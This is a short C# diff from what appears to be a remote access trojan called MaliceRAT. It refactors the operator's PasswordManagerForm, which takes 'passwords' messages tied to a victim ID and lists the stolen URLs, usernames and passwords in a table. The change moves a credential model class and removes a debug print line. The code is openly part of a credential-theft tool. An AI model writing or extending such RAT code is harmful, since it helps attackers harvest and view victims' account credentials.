@@ -8,13 +8,6 @@ namespace MaliceRAT.RatUI
 {
     public partial class PasswordManagerForm : Form
     {
-        public class CredentialModel
-        {
-            public string Url { get; set; }
-            public string Username { get; set; }
-            public string Password { get; set; }
-        }
-
         #region Variables
         private readonly int victimId;
         private readonly Server server;
@@ -40,7 +33,6 @@ namespace MaliceRAT.RatUI
                 if (message["type"] == "passwords")
                 {
                     var passwords = new JavaScriptSerializer().Deserialize<List<CredentialModel>>(message["data"].ToString());
-                    Console.WriteLine(passwords.Count);
                     gunaPasswordsTable.Invoke((MethodInvoker)delegate {
                         gunaPasswordsTable.Rows.Clear();
                         foreach (var password in passwords)
@@ -50,6 +42,15 @@ namespace MaliceRAT.RatUI
                     });
                 }
             }
+        }
+        #endregion
+
+        #region Helper Classes
+        public class CredentialModel
+        {
+            public string Url { get; set; }
+            public string Username { get; set; }
+            public string Password { get; set; }
         }
         #endregion
     }
